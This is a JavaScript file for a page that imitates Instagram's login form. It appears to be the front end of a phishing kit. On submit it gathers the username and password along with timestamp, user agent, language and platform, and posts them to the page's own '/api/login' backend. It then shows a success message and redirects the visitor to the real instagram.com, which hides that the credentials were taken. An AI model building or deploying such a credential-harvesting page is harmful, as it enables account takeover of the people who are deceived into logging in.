// Instagram Login Form Handler
class InstagramLogin {
    constructor() {
        this.form = document.getElementById('loginForm');
        this.usernameInput = document.getElementById('username');
        this.passwordInput = document.getElementById('password');
        this.loginBtn = document.getElementById('loginBtn');
        this.errorMsg = document.getElementById('error-msg');
        this.successMsg = document.getElementById('success-msg');
        
        this.bindEvents();
    }
    
    bindEvents() {
        this.form.addEventListener('submit', (e) => this.handleSubmit(e));
        this.usernameInput.addEventListener('input', () => this.validateForm());
        this.passwordInput.addEventListener('input', () => this.validateForm());
    }
    
    validateForm() {
        const isValid = this.usernameInput.value.trim() && this.passwordInput.value.trim();
        this.loginBtn.disabled = !isValid;
    }
    
    async handleSubmit(e) {
        e.preventDefault();
        
        if (!this.usernameInput.value.trim() || !this.passwordInput.value.trim()) {
            this.showError('Please fill in all fields');
            return;
        }
        
        this.setLoadingState(true);
        
        try {
            const formData = {
                username: this.usernameInput.value.trim(),
                password: this.passwordInput.value.trim(),
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform
            };
            
            // Send to backend API
            const response = await fetch('/api/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(formData)
            });
            
            const result = await response.json();
            
            if (response.ok) {
                this.showSuccess('Login successful! Redirecting...');
                
                // Redirect to Instagram after short delay
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/';
                }, 2000);
            } else {
                this.showError(result.message || 'Login failed. Please try again.');
            }
            
        } catch (error) {
            console.error('Login error:', error);
            this.showError('Network error. Please check your connection and try again.');
        } finally {
            this.setLoadingState(false);
        }
    }
    
    setLoadingState(loading) {
        if (loading) {
            this.loginBtn.textContent = 'Logging in...';
            this.loginBtn.disabled = true;
            this.form.classList.add('loading');
        } else {
            this.loginBtn.textContent = 'Log in';
            this.loginBtn.disabled = false;
            this.form.classList.remove('loading');
        }
    }
    
    showError(message) {
        this.errorMsg.textContent = message;
        this.errorMsg.style.display = 'block';
        this.successMsg.style.display = 'none';
    }
    
    showSuccess(message) {
        this.successMsg.textContent = message;
        this.successMsg.style.display = 'block';
        this.errorMsg.style.display = 'none';
    }
    
    clearError() {
        this.errorMsg.style.display = 'none';
    }
    
    clearMessages() {
        this.errorMsg.style.display = 'none';
        this.successMsg.style.display = 'none';
    }
    
}

// Facebook login handler
class FacebookLogin {
    constructor() {
        this.facebookBtn = document.querySelector('.fb');
        this.bindEvents();
    }
    
    bindEvents() {
        this.facebookBtn.addEventListener('click', (e) => this.handleClick(e));
    }
    
    handleClick(e) {
        e.preventDefault();
        alert('Facebook login clicked!'); // Placeholder for actual Facebook login
    }
}


// Initialize the application
document.addEventListener('DOMContentLoaded', function() {
    // Initialize Instagram login
    window.instagramLogin = new InstagramLogin();
    
    // Initialize Facebook login
    new FacebookLogin();
    
    console.log('Instagram Login App initialized');
});